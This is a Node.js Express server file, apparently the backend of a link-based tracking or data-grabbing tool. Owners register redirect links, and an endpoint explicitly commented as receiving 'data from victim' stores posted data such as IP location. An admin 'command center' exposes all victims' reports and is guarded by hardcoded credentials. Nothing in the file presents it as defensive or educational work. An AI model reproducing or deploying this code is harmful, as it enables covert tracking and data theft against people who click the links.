
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// In-memory database (Resets on server restart)
let reports = [];
let registeredLinks = []; 

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'dist')));

// Admin Credentials
const ADMIN_USER = "helloworld";
const ADMIN_PASS = "aadi";

// API to register a link
app.post('/api/register-link', (req, res) => {
  const { id, ownerId, redirectUrl, name } = req.body;
  if (!id || !ownerId || !redirectUrl) {
    return res.status(400).json({ error: 'Missing link parameters' });
  }
  registeredLinks.push({ id, ownerId, redirectUrl, name, createdAt: new Date().toISOString() });
  res.status(200).json({ status: 'success' });
});

// API to get link info
app.get('/api/link-info/:id', (req, res) => {
  const link = registeredLinks.find(l => l.id === req.params.id);
  if (!link) return res.status(404).json({ error: 'Link not found' });
  res.json({ redirectUrl: link.redirectUrl });
});

// API to receive data from victim
app.post('/api/reports/:linkId', (req, res) => {
  const { linkId } = req.params;
  const reportData = req.body;
  const linkRecord = registeredLinks.find(l => l.id === linkId);
  const ownerId = linkRecord ? linkRecord.ownerId : 'ANONYMOUS';

  const newReport = { 
    ...reportData, 
    linkId,
    ownerId,
    receivedAt: new Date().toISOString() 
  };
  
  reports.unshift(newReport); 
  res.status(200).json({ status: 'success' });
});

// Standard User: Get reports scoped to owner
app.get('/api/all-reports', (req, res) => {
  const { ownerId } = req.query;
  if (!ownerId) return res.status(400).json({ error: 'Owner ID required' });
  const filtered = reports.filter(r => r.ownerId === ownerId);
  res.json(filtered);
});

// Admin: Get GLOBAL intelligence (All reports, all links)
app.post('/api/admin/global-intel', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    res.json({
      reports: reports,
      links: registeredLinks,
      stats: {
        totalReports: reports.length,
        totalNodes: registeredLinks.length,
        uniqueIps: new Set(reports.map(r => r.location?.ip)).size
      }
    });
  } else {
    res.status(401).json({ error: 'Unauthorized access to command center.' });
  }
});

app.delete('/api/reports', (req, res) => {
  const { ownerId } = req.query;
  if (!ownerId) return res.status(400).send('Owner ID required');
  reports = reports.filter(r => r.ownerId !== ownerId);
  res.status(200).send('Cleared');
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`SERVER RUNNING ON PORT ${PORT}`);
});
